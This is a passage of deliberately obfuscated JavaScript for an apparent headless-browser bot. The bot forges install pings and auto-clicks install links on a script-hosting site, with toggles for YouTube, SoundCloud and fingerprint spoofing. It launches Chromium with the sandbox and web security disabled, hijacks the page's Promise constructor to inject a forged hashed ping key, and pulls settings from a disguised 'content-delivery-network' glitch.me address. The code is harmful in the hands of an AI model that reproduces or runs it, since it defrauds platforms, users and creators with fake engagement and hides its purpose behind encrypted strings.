                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x3 * 0x8cb + 0xafb + -0x254c; J < 0xd7e + 0x1 * -0xf12 + -0x79 * -0x4; ++J)
                K = Q[J - (-0x238 * 0xf + -0x18af * 0x1 + -0x52 * -0xb5)] ^ Q[J - (-0x2d8 + -0x2 * 0xa97 + -0x1 * -0x180e)] ^ Q[J - (-0x19ac + -0x1 * -0x2133 + 0x1 * -0x779)] ^ Q[J - (0x1b35 + -0x82 + -0x8e1 * 0x3)], Q[J] = K << 0x251 * -0x4 + -0xb80 + 0x14c5 | K >>> 0x1a5 * -0x5 + 0xa71 + -0x219;
              for (J = 0x25f3 + 0x1527 + -0x3b1a; J < 0x441 * 0x1 + 0x69d + -0xaca; J += 0x1785 + 0x4 * -0x7c + -0x1590)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1d32 + 0x14a2 + 0x895 * 0x1 | L >>> 0x19b5 + -0xddb + -0xbbf) + (M & N | ~M & O) + P + (0xeedfd8 * 0x3f + 0x2816b3 * 0x3e9 + -0x7d075e7a) + Q[J] << 0x27f + -0x58 * -0x3d + -0x1777) << -0x2b3 + 0x2bf * -0xa + 0x1e2e | P >>> 0xe * -0x15f + 0x650 + 0x1db * 0x7) + (L & (M = M << -0x2ed * -0x5 + -0x2180 + 0x12fd * 0x1 | M >>> 0x246d + 0x1 * 0x1ae3 + -0x1 * 0x3f4e) | ~L & N) + O + (0x324d69a + 0x1b3b092f * 0x3 + 0x5ac8772) + Q[J + (0x236e + -0x1ae8 + -0x2d7 * 0x3)] << -0x13c7 + -0xf87 + -0x1 * -0x234e) << 0x1 * 0x1e3b + 0x1974 + -0x1e * 0x1db | O >>> -0x199 * -0x11 + 0x107f + -0x2b8d) + (P & (L = L << 0x778 + 0xdb7 + -0x1511 * 0x1 | L >>> 0x3a0 * 0x8 + -0x17fe + -0x500) | ~P & M) + N + (0xae8c338 + 0x9619727d + -0x467fbc1c) + Q[J + (-0x1100 + -0x1767 + -0x815 * -0x5)] << 0x1 * -0x2e0 + -0xb * -0x2fe + -0x1e0a) << 0x120a + -0xa30 + -0x5 * 0x191 | N >>> 0x12f1 + -0x1632 + 0x35c) + (O & (P = P << 0x5 * 0x2ef + -0x61 * -0x16 + 0x7a1 * -0x3 | P >>> -0x9fc + 0x3 * 0xad9 + 0x1 * -0x168d) | ~O & L) + M + (-0x47bf2ad5 + -0x59ed746e + 0xec * 0x1118e35) + Q[J + (0x42 * -0x8 + -0x1 * 0xdf3 + -0x1 * -0x1006)] << -0x2 * 0xfc1 + 0x2d1 * 0x8 + 0x3 * 0x2fe) << 0xb * -0x27d + 0x3 * 0x74c + 0x580 | M >>> 0x9aa + -0x2d9 * 0x7 + 0xa60) + (N & (O = O << 0x11c2 * -0x1 + 0x287 * -0x1 + 0x1467 | O >>> 0x4b3 + -0x1408 + -0x33 * -0x4d) | ~N & P) + L + (0x2 * -0x394c3422 + 0x4971 * 0x102dc + 0xbb20bb * 0xb3) + Q[J + (-0xf75 * -0x1 + 0x1c2c + -0x23 * 0x13f)] << -0x1b59 * 0x1 + 0x2 * -0x1042 + 0x3bdd, N = N << 0x1fd1 + -0x5 * -0x7f + -0x222e | N >>> 0x36d + 0x130 * 0x8 + -0x1 * 0xceb;
              for (; J < -0x3af + -0x84 + -0xdf * -0x5; J += -0x971 + -0x16 * 0x95 + 0x1644)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xb41 + 0x435 * 0x3 + -0x159 | L >>> -0x6b9 + 0x7 * -0x4d3 + -0x1 * -0x2899) + (M ^ N ^ O) + P + (0x43 * 0x1f05c04 + -0x14c3ece * -0x9f + 0x7457503 * -0x1f) + Q[J] << 0x569 + -0x3f2 + -0x177) << 0x203e + 0x540 + -0x2579 * 0x1 | P >>> 0x47 * -0x1 + 0x4d * 0x52 + -0x1848) + (L ^ (M = M << -0x65c + 0x140b + -0xd91 | M >>> -0x221c + -0x26b8 + -0x2 * -0x246b) ^ N) + O + (0xc88cfb34 + -0xd1101057 + 0x775d00c4) + Q[J + (-0x1182 + 0x2151 + -0xfce)] << 0x95 * 0x5 + 0x9b * -0x7 + 0x154) << -0x246d + -0x1 * -0x122f + 0x1243 | O >>> 0x244c * 0x1 + 0xabf + -0x2ef * 0x10) + (P ^ (L = L << 0x219e + 0x84 * 0x2e + -0x3938 | L >>> -0x1b41 + -0x1ba * 0xd + 0x31b5) ^ M) + N + (-0x1582daea + 0xc7ac35d1 + -0x434f6f46) + Q[J + (-0x2323 + 0x14 * -0x133 + 0x3b21)] << -0x2340 + 0x2b4 * -0x5 + 0x30c4) << -0x517 * 0x2 + 0x25b5 * 0x1 + 0x3ee * -0x7 | N >>> 0x10d + 0x1f * 0xf2 + -0x1e40) + (O ^ (P = P << 0x10ee + 0x1 * -0x215f + -0x1d7 * -0x9 | P >>> -0x1 * -0xda5 + 0xfba * 0x1 + -0x1d5d) ^ L) + M + (-0x2 * 0x4298ab5e + -0x3f20849a * 0x2 + -0x1 * -0x1724c4b91) + Q[J + (0xed2 + -0x1 * 0x1230 + 0x5 * 0xad)] << 0x971 + -0x123c + 0x8cb) << -0x1 * -0x4ff + 0x11 * 0x219 + -0x28a3 * 0x1 | M >>> 0x8 * -0x346 + -0x67f + 0x1065 * 0x2) + (N ^ (O = O << 0x2 * 0x5 + 0x1b6 + -0x1a2 | O >>> -0x1682 + -0x174b * 0x1 + 0x3 * 0xf45) ^ P) + L + (0x1 * -0x332d08fc + -0x439eae * -0x2b4 + -0x14c1f9bb) + Q[J + (0xc99 + 0x17b * 0x6 + -0x44b * 0x5)] << 0x1fd4 + 0x6 * -0x503 + 0x9 * -0x32, N = N << -0xad * 0x11 + -0xc1 * -0x2b + -0x14d0 | N >>> 0x1 * -0x223 + -0x1ba5 + 0xf6 * 0x1f;
              for (; J < -0x105e + -0x22aa + 0x3344; J += 0xd75 + 0x526 * -0x6 + 0x4 * 0x45d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2 * 0x90a + -0x21d6 + -0x241 * -0x7 | L >>> 0xb16 + -0xd95 + 0x29a) + (M & N | M & O | N & O) + P - (-0xa9a9da86 + 0x570769fc + 0xc386b3ae * 0x1) + Q[J] << -0x2072 * -0x1 + -0x1d45 + -0x32d) << 0x9ea + -0xad * 0x9 + -0x3d0 | P >>> -0x13 * 0x1ae + -0xb24 + -0x2b29 * -0x1) + (L & (M = M << 0x459 + 0x1 * -0x1d63 + 0x1928 | M >>> -0x1414 + -0x3 * -0xbe1 + 0x3 * -0x52f) | L & N | M & N) + O - (-0x2821454 + 0x9d * -0x9c1163 + 0x1 * 0xd31d012f) + Q[J + (0x1 * -0x985 + 0x1f94 + -0x160e)] << 0x77 * -0x33 + 0xf7 * 0xf + 0x93c) << -0x36 * -0x7e + -0x871 * 0x3 + -0x13c | O >>> 0x205b + 0x1bec + -0x3c2c) + (P & (L = L << 0x2 * -0xbbe + 0x8 * 0x4a2 + -0xd76 | L >>> 0x3d1 * -0xa + -0x3e3 + 0x2a0f) | P & M | L & M) + N - (0x6bca7a7c + -0x89989474 + 0x1109d5a * 0x86) + Q[J + (0x1 * -0xc36 + 0xa * 0x36 + 0xa1c)] << 0x792 + -0x1701 + -0x1 * -0xf6f) << -0x1 * -0xc0b + -0x513 + -0x6f3 | N >>> 0x14 * 0x1ab + -0x1462 + -0xcdf) + (O & (P = P << 0x1a3b + 0xde3 * 0x2 + 0x1f * -0x1bd | P >>> 0x30 * -0x9d + -0x1 * -0x1a7d + 0x2f5) | O & L | P & L) + M - (-0xb70816 * 0x3 + -0x379f3525 + 0x12f648f3 * 0x9) + Q[J + (-0x2 * 0x757 + 0xa * 0x211 + 0x5f9 * -0x1)] << -0x78 + 0x3 * -0xa36 + -0x1f1a * -0x1) << -0x6d + -0xe6 * 0x28 + 0x1231 * 0x2 | M >>> -0x2529 + -0x11a3 + 0x36e7) + (N & (O = O << -0x1feb + -0x1 * 0x5cf + 0x25d8 | O >>> 0x9 * 0x3f3 + -0x239 + 0x34 * -0xa4) | N & P | O & P) + L - (-0x3b8d9d06 + 0x4d68f794 + -0xa * -0x980e40f) + Q[J + (-0x6ad * 0x3 + 0xa3 * -0x5 + 0x1 * 0x173a)] << -0x9 * -0x229 + -0xb53 * 0x3 + 0xe88, N = N << 0x7 * -0x593 + -0x3b * -0x3a + 0x19c5 | N >>> 0x244d * 0x1 + 0x1 * 0x10a9 + -0x1a7a * 0x2;
              for (; J < 0x2ef * 0x1 + 0x18cd + -0x104 * 0x1b; J += 0x2 * -0x77a + 0xbd * -0x21 + 0x26 * 0x109)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2523 * 0x1 + -0x8ce + 0xf52 * 0x3 | L >>> -0x1604 + -0x563 + 0x1b82) + (M ^ N ^ O) + P - (0x24018992 + -0x2142ccc5 + -0x49fdd37 * -0xb) + Q[J] << -0x17b6 + -0x1eaf + 0xae1 * 0x5) << 0x1 * -0x15b1 + 0x1073 + 0x543 | P >>> -0xf2 * -0x5 + -0x1a23 * -0x1 + -0x1ec2) + (L ^ (M = M << -0x581 * 0x1 + -0x592 + 0xb31 | M >>> 0x1f3c + -0x2033 + 0x3 * 0x53) ^ N) + O - (0x1453dfec + 0x5807a7e6 + 0x4 * -0xdaf926a) + Q[J + (-0x259f + 0x18de + 0xcc2)] << 0x5e * -0x1d + -0x149f + 0x1f45) << -0x192 + -0x2f9 + 0x490 | O >>> -0x23 * -0xbf + -0xc83 + 0x1 * -0xd7f) + (P ^ (L = L << -0x1f * -0x45 + 0x59c + -0xdd9 * 0x1 | L >>> -0x11a9 + -0x41e + 0x15c9) ^ M) + N - (0xfe70235 * 0x2 + 0x1 * -0x2ec3d33f + 0x44930cff) + Q[J + (0x27b * -0x3 + 0x1 * -0xf5d + 0xb68 * 0x2)] << 0x1ac + -0x19d + -0x5 * 0x3) << -0x11ab * -0x2 + -0x129d + -0x42d * 0x4 | N >>> 0x4 * -0x84b + -0x1 * 0x1dda + 0x3f21) + (O ^ (P = P << -0x18f0 + -0x246f * -0x1 + -0xb61 | P >>> 0x4f * 0x43 + 0x10e * 0x1f + 0x2cf * -0x13) ^ L) + M - (0x9 * -0x98ca9cd + 0x4eb * 0xad109 + 0x565d2f1c) + Q[J + (0x2286 + -0x2509 + -0x11 * -0x26)] << 0x4 * -0x6c4 + -0x4d0 + 0x1e * 0x110) << 0x1 * 0x1286 + 0x1420 + -0x1d * 0x155 | M >>> -0x1 * -0x1b41 + -0x1 * -0x1af3 + -0x3619) + (N ^ (O = O << 0x2446 + 0xdbc + -0x31e4 | O >>> 0x1 * 0xb07 + 0xcb * 0x9 + -0x1228) ^ P) + L - (0x1 * -0x663f0077 + 0x1 * -0x42d4cd73 + -0x1c * -0x7f40993) + Q[J + (-0x1 * -0xc53 + 0x209e + -0x2ced)] << -0x1e87 + 0x2 * 0xdd3 + -0x1 * -0x2e1, N = N << -0x2246 + 0x630 + 0x2 * 0xe1a | N >>> 0x1 * -0x12e7 + -0x53c * -0x4 + -0x1 * 0x207;
              this['h0'] = this['h0'] + L << -0x4 * -0x32b + 0x1 * 0x1be6 + 0x6c3 * -0x6, this['h1'] = this['h1'] + M << 0x11 * -0x219 + -0x55a + 0x2903, this['h2'] = this['h2'] + N << 0x265e * -0x1 + -0x8d + -0x1 * -0x26eb, this['h3'] = this['h3'] + O << -0x2692 + 0x17 * 0x16a + -0x60c * -0x1, this['h4'] = this['h4'] + P << 0x10e3 * 0x1 + 0x1528 + 0x260b * -0x1;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0xef2 + -0x5 * 0x511 + 0x2863 & -0xc24 + 0xa79 + 0x11 * 0x1a] + w[J >> -0x7ba + 0xc82 + -0x10 * 0x4b & -0x2 * -0xb11 + -0x1b55 + 0x542] + w[J >> -0x1192 + 0x1457 * -0x1 + 0x25fd & 0x676 + 0xbf * 0x4 + -0x963] + w[J >> 0x1a41 + -0x1 * -0xb9b + -0x25cc & 0x1 * 0x29d + 0x4 * -0x88 + -0x5 * 0x16] + w[J >> -0x9f1 * -0x1 + -0x17d8 + -0x1 * -0xdf3 & 0x16c5 + -0xb09 + -0xbad] + w[J >> 0x5 * -0xa7 + -0x588 + 0x8d3 * 0x1 & 0x192 * 0x7 + -0x1eb4 + 0x15 * 0xf1] + w[J >> -0x6 * 0x1a3 + -0x140b + 0x1de1 * 0x1 & -0x1fb9 + -0x2 * 0x1301 + 0x45ca * 0x1] + w[0x1 * 0x1069 + 0x1 * -0x2168 + 0x887 * 0x2 & J] + w[K >> -0x71 * 0x3d + -0x23bb * -0x1 + -0x8b2 & -0x1 * -0x1a53 + 0x1c94 + 0x4 * -0xdb6] + w[K >> 0xbbd + -0x1402 * 0x1 + 0x1 * 0x85d & -0xfb7 + -0x1f94 * -0x1 + -0xfce] + w[K >> 0x15cf + -0x47a + -0x1141 & 0x789 + -0x763 + 0x17 * -0x1] + w[K >> 0x110a + 0xa7 * -0x35 + 0x1199 & 0xe5 * -0x13 + 0x1 * -0x2585 + 0x3693] + w[K >> -0x2187 + -0x4 * -0x954 + -0x3 * 0x13f & 0x2400 + -0xcb3 * 0x3 + 0x228] + w[K >> 0x1f3 * -0xd + -0x1cd6 + 0x3635 & 0x1327 * -0x2 + -0x415 * -0x7 + 0x9ca] + w[K >> -0x229e + -0x64d * 0x6 + 0x4870 & -0xa67 * 0x1 + -0x17 * -0x12 + 0x2 * 0x46c] + w[0x1d1 * -0x3 + -0x75b + 0x59 * 0x25 & K] + w[L >> 0x4e9 * 0x3 + -0x1875 + -0x2 * -0x4eb & 0x704 + -0x1f8a + 0x1895] + w[L >> 0x4f6 + -0xa4f * 0x3 + 0x7 * 0x3b9 & -0x1cea + 0x1 * -0x2688 + 0x4381 * 0x1] + w[L >> 0x1 * -0x29f + -0x8a9 + 0xb5c & -0x1d * -0x1d + 0x2 * -0x12e5 + -0x1c * -0x13c] + w[L >> -0x491 * 0x1 + 0x2272 + -0x1dd1 & -0x84e + -0x668 + -0x1 * -0xec5] + w[L >> -0x1 * -0x1c81 + 0x269f * -0x1 + -0xa2a * -0x1 & -0x1 * -0x1901 + -0x137 * -0xd + 0x28bd * -0x1] + w[L >> -0x26c * -0x6 + -0x493 * 0x6 + 0xcf2 * 0x1 & -0x1a9b + 0x8ba + 0xa4 * 0x1c] + w[L >> 0x34 * 0x9b + -0x495 + -0x1 * 0x1ae3 & -0x5df + 0x1f7b + -0x198d] + w[-0xadb * -0x3 + -0xf6d + 0x1115 * -0x1 & L] + w[M >> 0x1a92 + -0x1749 + -0x10f * 0x3 & -0x3b * -0x13 + 0x112 * 0xe + -0x9a7 * 0x2] + w[M >> -0x19b * -0xc + 0x1937 + -0x1 * 0x2c63 & 0x2072 * 0x1 + 0xb81 + -0x2be4] + w[M >> 0x1aee + -0x3 * 0x487 + 0x2b * -0x4f & 0xeca + 0x1 * 0x2523 + -0x33de] + w[M >> -0x1c3 * -0xf + -0xc63 + -0x2 * 0x6fd & 0x110 * -0x6 + -0x3 * -0xc5e + -0x1eab] + w[M >> 0x1f * -0x12f + -0x1566 + -0x16b * -0x29 & 0x7c8 + -0x97 * 0x34 + -0x16f3 * -0x1] + w[M >> -0xbcb + -0x16f8 + -0x1 * -0x22cb & 0x1084 + -0x153 * 0x14 + 0xa07] + w[M >> 0x202a + -0x1 * 0x21af + -0x83 * -0x3 & -0xa43 + 0x3 * 0x88a + 0xf4c * -0x1] + w[-0x1937 + -0x8a5 * -0x1 + 0x2b * 0x63 & M] + w[N >> 0x94b + 0x23b6 + -0x1 * 0x2ce5 & 0x5 * 0x5ce + -0x245d * 0x1 + -0x766 * -0x1] + w[N >> -0xec1 + 0x547 + 0x992 & -0x103 * 0x2 + 0x1 * 0x851 + 0x10a * -0x6] + w[N >> 0x652 * 0x4 + 0x6b1 * 0x3 + 0x1 * -0x2d47 & 0x2161 * -0x1 + -0x12b * 0x6 + 0x2872] + w[N >> -0xb * 0x169 + -0x1281 + -0xc * -0x2d7 & 0x2c4 * -0x1 + -0x1 * -0x100a + 0x11 * -0xc7] + w[N >> -0x25ad + 0x17 + -0x25a2 * -0x1 & 0x362 * 0xb + -0x11f5 * -0x2 + 0xf * -0x4df] + w[N >> 0x15d * 0x1 + 0x1 * 0x2c5 + -0x1e * 0x23 & -0x7d9 + 0x19f3 + -0x95 * 0x1f] + w[N >> 0x1eed + 0xb * 0x106 + -0x2a2b & -0x1 * -0x7ec + -0x254 * -0xd + -0x2621] + w[0x1 * -0x1db7 + -0xf22 + 0x2ce8 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0xa3f * -0x1 + 0x2429 + -0x2 * 0xce9 & 0x215 * -0x11 + 0x114 * 0x5 + 0xf80 * 0x2,
                J >> 0x2e * -0x67 + 0x1ba + 0x10d8 & -0x1 * 0xc29 + -0x12 * -0xd5 + -0x1d2,
                J >> 0xa9b + -0x1681 + 0xbee & 0x2 * -0xf85 + 0x1dd9 * 0x1 + -0x8 * -0x46,
                0x52a * -0x1 + -0x567 + 0xb90 & J,
                K >> -0x683 * -0x5 + 0xa2 * 0x39 + -0x79 * 0x91 & -0x2e * -0x3e + 0x551 * -0x1 + -0x2 * 0x26a,
                K >> 0x2467 * 0x1 + 0x18d * -0x1 + 0x2 * -0x1165 & 0x1a15 + -0x74a * 0x3 + -0x338 * 0x1,
                K >> 0x3e * 0x43 + 0x1ff5 + -0x3027 & 0x1205 + -0x3a * 0x9d + 0x128c,
                -0xc31 + 0xd * -0x211 + 0x280d & K,
                L >> -0x1cf1 * -0x1 + -0x1 * 0x1487 + -0x429 * 0x2 & 0x1043 + -0x4a2 + -0xaa2,
                L >> -0x1f4 + -0xf09 + 0x110d & -0x7 * -0x2d7 + 0xd3d + -0x201f,
                L >> -0x1 * 0x26ef + -0x3 * -0x52c + 0xcf * 0x1d & 0x13 * 0x136 + -0x164 + -0x149f,
                0x5bf * 0x4 + 0x887 * 0x2 + 0x5 * -0x7cf & L,
                M >> -0x11e7 + 0x1 * -0x38b + 0x158a & -0x23f0 + -0x5bf * 0x6 + 0x4769,
                M >> 0xb04 + -0x8 * 0x35e + -0x1f * -0x84 & 0x1d55 + 0x3af + 0x7 * -0x493,
                M >> 0xb95 + 0x13f * 0xf + -0x31 * 0x9e & -0x19b7 + -0x1 * -0x2057 + -0x5a1 * 0x1,
                0x1f21 + -0x19b6 + -0x11b * 0x4 & M,
                N >> -0x2132 + 0x2 * -0xee1 + 0xc9c * 0x5 & -0x1e1 * -0x6 + -0x1b * -0xcb + -0x1fb0,
                N >> 0xce0 * 0x2 + -0x1 * 0x1191 + -0x81f & 0x253d + 0x18a * 0x11 + -0x3e68,
                N >> 0x1 * 0xa5 + -0xd * 0x2a6 + -0x21d1 * -0x1 & -0x838 + -0x24ad + 0xb2 * 0x42,
                0x20b0 + 0x1e33 * 0x1 + 0x3a4 * -0x11 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x45 * -0x4f + 0x3 * 0x1e9 + -0x1af2), (K = new DataView(J))['setUint32'](0x2260 + 0x13e2 + 0x6 * -0x90b, this['h0']), K['setUint32'](-0xe * -0xb3 + 0x1b45 + -0x250b, this['h1']), K['setUint32'](0x1cc9 + -0x13d9 + -0x8e8, this['h2']), K['setUint32'](-0x2f0 + 0xd18 + -0xa1c * 0x1, this['h3']), K['setUint32'](0x178c + 0x1466 + 0x2be2 * -0x1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x461 + -0x24c9 + 0x1 * 0x292a];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x12c2 + 0x1d * 0x8d + -0x22bb;
            J[0x3 * 0xc73 + 0x298 * -0x8 + -0x7 * 0x25f]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x1 * -0x13 + 0x565 * -0x1 + 0x38 * 0x19] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1 * 0x215b + -0x409 * 0x5 + 0x3589), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x479 * 0x1 + -0x4 * 0x576 + 0x1160;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x1 * -0x89 + 0x1d * -0x59 + -0xf68 * -0x1), Promise['resolve'](-0x26ff * 0x1 + -0x1a1a + 0x411a);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x439 + 0xb01 + 0x2 * -0x79d; j < -0x334 + 0x1298 + -0x1 * 0xf63; j++)
    i();
}
const NETWORK_PATIENCE = -0x110 * -0x23 + -0x1056 * 0x3 + -0x1 * -0x2b12 + (0xeb9 * -0x2 + -0xff7 + 0x3921) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x8 * -0x322 + 0xcc4 + -0x25d1) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + V(0x11) + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x2359 * -0x1 + -0x3f9 * -0x1 + 0x1 * 0x1f60);
    let h = e[f];
    if (b['itdWzx'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x2 * 0x247 + 0x217 + -0x1 * -0x277, s, t, u = -0x245 + 0x16dc + -0x1497; t = n['charAt'](u++); ~t && (s = r % (0x15bc + -0x323 * 0x1 + -0x1295) ? s * (-0x1692 + -0xd8d + 0x245f) + t : t, r++ % (0x2 * 0x117f + 0x4ea + -0x25 * 0x114)) ? p += String['fromCharCode'](0x1a82 + -0xb3 + -0x18d0 & s >> (-(0x2563 + -0x1f * -0xa7 + -0x92 * 0x65) * r & 0x1d10 + -0x1 * -0xc63 + -0x296d)) : -0x347 + 0x2 * 0x1233 + -0x211f) {
          t = o['indexOf'](t);
        }
        for (let v = -0x2 * -0xeaf + -0x151 * 0x5 + -0x16c9, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x47a + 0x1 * -0x917 + 0x4ad))['slice'](-(-0x1 * 0x10b1 + 0x1861 + -0x7ae));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x216 * 0xd + -0x86d + -0x1 * -0x238b,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x4fe + -0x3 * -0x42b + -0x783; u < -0x1183 + -0x1f9f * 0x1 + 0x3222 * 0x1; u++) {
          p[u] = u;
        }
        for (u = 0x15a1 + 0x1571 + -0x2b12; u < -0x1318 + 0xb56 + 0x8c2; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0xedb * -0x2 + 0x191 * -0x4 + -0x1672 * 0x1), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1 * 0x119 + -0x419 * 0x7 + -0x1b96 * -0x1, q = 0x41b + -0x4ef + -0x2 * -0x6a;
        for (let v = -0x245e + -0x637 + 0x2a95; v < n['length']; v++) {
          u = (u + (-0x757 + 0x21cc + -0x1a74)) % (-0x957 * 0x3 + -0x1ec7 + 0x3bcc), q = (q + p[u]) % (-0x11e7 * 0x2 + -0x12df * -0x2 + 0xf0 * -0x1), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x26cb * -0x1 + 0x1356 + -0x1475 * -0x1)]);
        }
        return t;
      };
      b['WwZipT'] = m, c = arguments, b['itdWzx'] = !![];
    }
    const j = e[0xccc + -0x1b99 + -0x4ef * -0x3],
      k = f + j,
      l = c[k];
    return !l ? (b['ImjLMc'] === undefined && (b['ImjLMc'] = !![]), h = b['WwZipT'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x10e6 + 0x54a + 0xb9c; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());

function a() {
  const bl = [
    'https://wi',
    'ChrZl2j5lxnPDa',
    'WPSSW5mWWRzLW71FA1m',
    'DcbYzwfJDcX3Aa',
    'WOhdMSonbXHVW5pdQ8otlW',
    'ss-bar',
    '\x20(KHTML,\x20l',
    'uKtdVSk8W5VdLSo3hSksWP0',
    'BMvJCMfMDcbIDq',
    'BgLJyxrPB24VCW',
    'pNNdMCkqW7hcISkLgsRdOW',
    'zwfZEwzVCMSUBW',
    'W6BdQSojgW',
    'mIu5msvfnIu5mG',
    'CMfUzg9T',
    'W4tcTSoigHHVW5NcQ8omDG',
    'ecko)\x20Chro',
    'adkjasbdjq',
    'Ahr0Chm6lY9NCG',
    'vmk/effOogW7f3K',
    'A3bVCcbIDhmSAG',
    'q9rLWEAzoo',
    'BMrIB3GSBw9VBq',
    'lastByteIn',
    'W4tdGmortSkuW4NdKh1zDq',
    'close',
    'tdfpEtvgnLPntW'
  ];
  a = function() {
    return bl;
  };
  return a();
}
let searchTerms = [];
